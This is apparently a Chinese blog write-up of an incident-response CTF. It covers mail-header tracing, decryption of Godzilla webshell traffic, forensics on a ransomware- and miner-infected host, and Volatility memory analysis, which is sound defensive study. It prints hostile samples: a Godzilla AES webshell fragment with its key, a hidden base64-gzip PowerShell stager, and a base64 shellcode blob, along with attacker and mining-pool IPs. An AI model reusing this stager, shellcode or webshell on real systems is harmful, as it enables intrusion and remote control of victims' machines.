---
title: 第一届solar杯·应急响应挑战赛 部分WP
date: '2025-01-09 09:58:32'
updated: '2025-01-10 10:08:41'
excerpt: 第一届solar杯·应急响应挑战赛 部分WP
tags:
  - 网络安全
  - 应急响应
categories:
  - 网络安全
permalink: /post/the-first-solar-cup-emergency-response-challenge-part-wp-zvl0ij.html
comments: true
toc: true
---

‍

**官方题解**：[mp.weixin.qq.com/s/kMvwfBJgd7ugaWzm5U-5Ww](https://mp.weixin.qq.com/s/kMvwfBJgd7ugaWzm5U-5Ww)

**笔者**：Agony

## 签到题

　　**题目：**

　　本题作为签到题,请给出邮服发件顺序。

```
Received: from mail.da4s8gag.com ([140.143.207.229])
by newxmmxszc6-1.qq.com (NewMX) with SMTP id 6010A8AD
for ; Thu, 17 Oct 2024 11:24:01 +0800
X-QQ-mid: xmmxszc6-1t1729135441tm9qrjq3k
X-QQ-XMRINFO: NgToQqU5s31XQ+vYT/V7+uk=
Authentication-Results: mx.qq.com; spf=none smtp.mailfrom=;
dkim=none; dmarc=none(permerror) header.from=solar.sec
Received: from mail.solar.sec (VM-20-3-centos [127.0.0.1])
by mail.da4s8gag.com (Postfix) with ESMTP id 2EF0A60264
for ; Thu, 17 Oct 2024 11:24:01 +0800 (CST)
Date: Thu, 17 Oct 2024 11:24:01 +0800
To: hellosolartest@qq.com
From: 鍏嬪競缃戜俊
Subject:xxxxxxxxxx
Message-Id: <20241017112401.032146@mail.solar.sec>
X-Mailer: QQMail 2.x

XXXXXXXXXX
```

1. **邮件最初发送**：

    * 邮件从 **mail.solar.sec** 服务器（IP 地址 127.0.0.1，表示本地发送）发送邮件，使用 ESMTP 协议通过 **Postfix** 进行处理。
    * 时间戳：Thu, 17 Oct 2024 11:24:01 +0800 (CST)

    ```
    Received: from mail.solar.sec (VM-20-3-centos [127.0.0.1])
    by mail.da4s8gag.com (Postfix) with ESMTP id 2EF0A60264
    for ; Thu, 17 Oct 2024 11:24:01 +0800 (CST)
    ```
2. **邮件转发**：

    * 接着，邮件被从 **mail.da4s8gag.com**（IP 地址 140.143.207.229）转发到 **newxmmxszc6-1.qq.com**。
    * 这个邮件服务器将邮件进一步处理，并安排将邮件发送给最终的接收邮箱。
    * 时间戳也是 Thu, 17 Oct 2024 11:24:01 +0800。

    ```
    Received: from mail.da4s8gag.com ([140.143.207.229])
    by newxmmxszc6-1.qq.com (NewMX) with SMTP id 6010A8AD
    for ; Thu, 17 Oct 2024 11:24:01 +0800
    ```

* 邮件的发送和转发确实发生在同一时间（11:24:01 +0800），这意味着它是在较短的时间内完成的。
* 首先，由 **mail.solar.sec** 发送邮件，然后被 **mail.da4s8gag.com** 接收，最后由 **newxmmxszc6-1.qq.com** 进行进一步的处理或转发。

　　所以，flag的结果为：

```
flag{mail.solar.sec|mail.da4s8gag.com|newxmmxszc6-1.qq.com}
```

## 流量分析

　　本题环境：

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109101103-wi2735d.png)​

### 文件排查

　　**题目：** <span data-type="text" style="background-color: var(--b3-font-background1);">新手运维小王的Geoserver遭到了攻击：
黑客疑似删除了webshell后门，小王找到了可能是攻击痕迹的文件但不一定是正确的，请帮他排查一下。</span>

　　‍

　　**解答：**

　　这种web日志，可以使用我自己写的web日志分析工具，看看情况：

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109105813-rvfbgvk.png)​

　　发现，攻击ip：`10.0.100.22 `​ 的一些扫描行为，并且都失败了

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109105850-1ytwk9n.png)​

　　没什么收获，手动查一下日志，日志文件**​`localhost_access_log.2024-12-16.txt`​**​：

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109110121-ncoo62v.png)​

　　发现跟b.jsp交互频繁，并且都是post请求，而且都是200状态码！意味着执行成功。🧐

　　回到上一个日期的日志文件，发现访问b.jsp最早在` 2024:23:31:49`​

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109110534-cidgq0w.png)​

　　根据访问目录找一下webshell，发现果然没有了，应该是webshell被删了

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109110441-rkg7bf9.png)​

　　这里补充一下知识：

　　在 Apache Tomcat 的运行环境中，`work/Catalina/localhost/ROOT/`​ 目录通常是用于存放 JSP 文件的编译产物的临时目录。当攻击者上传 WebShell（通常是以 `.jsp`​ 为后缀的文件）时，Tomcat 会自动将上传的 JSP 文件编译为 Java 源文件（`.java`​），并进一步编译为字节码文件（`.class`​），最终用于执行。

　　‍

　　查看临时目录，发现webshell的Java 源文件（应该就是这个`b.jsp`​），根据特征判断为`哥斯拉AES马`​。

```
apache-tomcat-9.0.96\work\Catalina\localhost\ROOT\org\apache\jsp\b_jsp.java
```

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109101906-pzuht3f.png)​

　　木马特征：

```powershell
 String code="ZiFsXmEqZ3tBN2I0X1g5ektfMnY4Tl93TDVxNH0="; String xc="a2550eeab0724a69"; class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }}

```

　　跟gsl的**​`JAVA_AES_RAW`​**​  木马 webshell特征一致：

　　下面是哥斯拉默认的webshell：

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109102732-fw3xwx3.png)​

　　​`flag`​为code的`base64`​解码。这道题可以直接使用D盾等webshell查杀工具找到webshell

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109111202-591zzqx.png)​

```powershell
f!l^a*g{A7b4_X9zK_2v8N_wL5q4}
```

### 流量解密

　　**题目：**

　　*新手运维小王的Geoserver遭到了攻击：*

　　*小王拿到了当时被入侵时的流量，其中一个IP有访问webshell的流量，已提取部分放在了两个pcapng中了。请帮他解密该流量。*

　　**解答：**

　　使用wireshark打开流量包

　　查看与 b.jsp 交互的 http流量：

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109141206-gkks6yv.png)​

　　flag存在数据包在 `7230 `​位置：

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109140049-lxh3ncz.png)​

　　因为已知是哥斯拉的`JAVA_AES_RAW`​的payload，可以通过题目1知道`xc=a2550eeab0724a69`​，解密时需要复制密文的十六进制，然后使用AES解密，最后使用`Gunzip()`​解压缩，因为哥斯拉传输数据时使用`Gunzip`​压缩。返回包不需要去掉前后的16位。

　　将原始数据拿到cyberchef 上去分析：

　　cyberchef需要设置如下图所示，记得要设置`Gunzip()`​：

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109113935-svd9z84.png)​

　　拿下flag：

```powershell
flag{sA4hP_89dFh_x09tY_lL4SI4}
```

### 文件提取

> *新手运维小王的Geoserver遭到了攻击：*
>
> *小王拿到了当时被入侵时的流量，黑客疑似通过webshell上传了文件，请看看里面是什么。*
>
> 使用流量解密工具进行解密流量并删除无用部分后另存为pdf。

　　看流量，发现这块流量很大，拿出来解密一下

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109145708-u05huc0.png)​

　　解密如下，应该上传了pdf文件：

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109145754-nymlcbe.png)​

　　根据题意所知，将数据库导出为pdf：

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109145912-e5r0k0j.png)​

　　打开pdf，拿下flag：

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109150006-lape9bl.png)​

```powershell
flag{dD7g_jk90_jnVm_aPkcs}
```

## 数据库

　　*说明：由于黑客在攻击时可能会修改用户口令、锁定登陆、破坏系统导致无法进入操作系统，因此本题不提供密码*

　　VMware虚拟机进入PE系统：

> PE镜像下载地址
>
> https://www.hotpe.top/download/

　　‍

　　PE镜像下载地址

　　[https://www.hotpe.top/download/](https://www.wepe.com.cn/download.html)

　　先下个pe工具箱，然后制作PE镜像

　　‍

　　在原D盘发现了该勒索病毒留下的说明：

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109165759-fcbed72.png)​

　　文件都被 X3rmENR07后缀加密了：

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109165957-8hm9xl4.png)​

　　该后缀是lockbit家族的病毒

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109165928-waz2r52.png)​

### **攻击者创建隐藏账户的时间**

　　先通过pe清空一下登录密码，成功登录系统：

　　‍

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109171510-3qenxic.png)​

　　排查windows日志，找security日志就好了，把日志拿出来，上工具排查，1秒不到处理完了：

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109171948-qq5ntff.png)​

　　看看结果，筛选 `4720`​（代表**创建用户**） 的日志：

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109172150-i2u0h7q.png)​

　　成功排查到这个日志，这个`test$`​用户就是黑客创建的，时间为：2024-12-16T15:24:21+08:00，

　　改为flag格式就是：

```powershell
flag{2024/12/16 15:24:21}
```

### 恶意文件的名称

　　直接打开文件管理器，一眼挖矿病毒：

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109172609-jvj5uz1.png)​

　　当然也可以用其他工具来排查，360，火绒等等

```powershell
flag{xmrig.exe}
```

### 外联地址

　　定位到挖矿木马文件地址，找到这个config.json文件：

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109173103-tksjiyx.png)​

　　矿池地址url如下：sierting.com

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109173139-340o263.png)​

　　DNS在线解析出ip地址：203.107.45.167

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109173242-0eqdwsg.png)​

```powershell
flag{203.107.45.167}
```

### 数据库修复

　　使用数据库修复工具 **D-Recovery SQL Server** 进行修复

　　选择被加密的数据库文件，在“选择参照mdf文件”按钮中选择“【非题目】mssql题-备份数据库（可能会用到）”中的纯表结构文件

　　省略。。。。

　　‍

　　主机感染了勒索病毒，由于加密程序可能只对文件部分内容进行篡改，则可能在数据库文件恢复到部分数据。通过分析数据库的本地文件`C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\*`​。

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109235225-te85ie7.png)​

　　在tempdb\_mssql\_3.ndf.X3rmENR07发现flag。

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109235730-524cob6.png)​

```powershell
flag{E4r5t5y6Mhgur89g}
```

　　‍

　　‍

### 逆向恶意powoshell的md5值

　　可以在“Windows PowerShell.evtx”日志文件中看到PowerShell执行情况，使用工具分析结果：

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109222732-gqievtr.png)​

　　可以看到攻击者在2024/12/16 15:23:01执行的PowerShell其中的

　　**New-Object System.IO.MemoryStream** ：用于 Base64 编码的字符串创建内存流。

　　**System.IO.Compression.GzipStream** ：解压缩 Gzip 编码的数据流。

　　**ReadToEnd()**  ：读取并执行解压后的数据内容。

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109222806-rh09f1e.png)​

```powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('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{0}')-f'A','f','M')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
```

　　‍

　　解密脚本如下：

```
import base64

base64_data = '''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'''
padding = '=' * (4 - len(base64_data) % 4)
base64_data += padding
compressed_data = base64.b64decode(base64_data)
with open("output.gz", "wb") as f:
    f.write(compressed_data)
print("保存成功")
```

　　解密之后是一个output.gz压缩包，里面有个test.txt文件：

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109223314-8a82j0j.png)​

　　这里又是

　　​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109223412-emoij8g.png)再次解密，脚本如下：

```powershell
import base64

base64_data = "/EiD5PDozAAAAEFRQVBSUUgx0lZlSItSYEiLUhhIi1IgTTHJSItyUEgPt0pKSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGESLQCBJAdBQ41ZI/8lNMclBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYQVheSAHQWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAAG9wKiu3EFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V"
padding = '=' * (4 - len(base64_data) % 4)
base64_data += padding
decoded_data = base64.b64decode(base64_data)
with open('data.bin', 'wb') as file:
    file.write(decoded_data)
print("保存成功")
```

　　计算md5值：

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109223735-6yzb1ya.png)​

```powershell
flag{d72000ee7388d7d58960db277a91cc40}
```

　　‍

## 内存取证

### 远程rdp连接的跳板地址

　　‍

　　使用内存分析工具`volatility`​（`https://github.com/volatilityfoundation/volatility`​）查看镜像基本信息。

```powershell
.\volatility_2.6_win64_standalone.exe -f .\SERVER-2008-20241220-162057.raw imageinfo
```

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109231750-ujx5i3n.png)​

　　使用建议的 profile：Win7SP1x64。分析3389端口网络连接情况，定位到跳板地址IP，得到flag。

```powershell
.\volatility_2.6_win64_standalone.exe -f .\SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 netscan
```

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109232053-net9f6y.png)​

```powershell
flag{192.168.60.220}
```

### 攻击者下载黑客工具的IP地址

　　查看历史cmd命令，找到黑客工具mimikatz的下载地址。

```powershell
.\volatility_2.6_win64_standalone.exe -f .\SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 cmdscan
```

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109232538-bfuztkn.png)​

```powershell
flag{155.94.204.67}
```

### 黑客获取的“FusionManager节点操作系统帐户（业务帐户）”的密码是什么

　　通过内存分析-2的cmd历史，推测攻击者查看了C:\\Users\\Administrator\\Desktop\\pass.txt密码文件。

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109232701-jhhwre1.png)​

　　使用`filescan`​插件扫描文件： 通过Volatility扫描内存转储，查找`pass.txt`​文件。

```powershell
.\volatility_2.6_win64_standalone.exe -f .\SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 filescan|findstr pass
```

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109232800-0rn10uz.png)​

　　使用`dumpfiles`​插件从内存中提取该文件，得到flag。

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109233158-hzu5tpv.png)​

```powershell
flag{GalaxManager_2012}
```

### 攻击者创建的用户

　　Security.evtx记录安全相关的事件，如登录、权限更改、系统策略修改等

　　搜索 Security.evtx  日志文件

```powershell
 .\volatility_2.6_win64_standalone.exe -f .\SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 filescan | findstr "Security.evtx"
```

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109233332-ox9mtjr.png)​

　　dump 日志文件

```powershell
.\volatility_2.6_win64_standalone.exe -f .\SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007e744ba0 -D .
```

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109233527-z6s3n5d.png)​

　　修改后缀为 .evtx ,使用工具分析查看下，分析失败了，原因是这个日志文件有损坏，这下只能手动查看了：

　　找到id为 4720 ：

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109234202-8bapjmj.png)​

```powershell
flag{ASP.NET}
```

### 攻击者利用跳板rdp登录的时间

　　找到 id为 4624 的日志：

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109234746-qwrfxw8.png)​

```powershell
flag{2024/12/21 0:15:34}
```

### 攻击者创建用户的密码哈希值

　　使用`hashdump`​插件获取用户hash信息，其中ASP.NET用户的NT哈希值为：`5ffe97489cbec1e08d0c6339ec39416d`​

```
.\volatility_2.6_win64_standalone.exe -f .\SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 hashdump
```

​![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109234922-dllgdq9.png)​

```powershell
flag{5ffe97489cbec1e08d0c6339ec39416d}
```
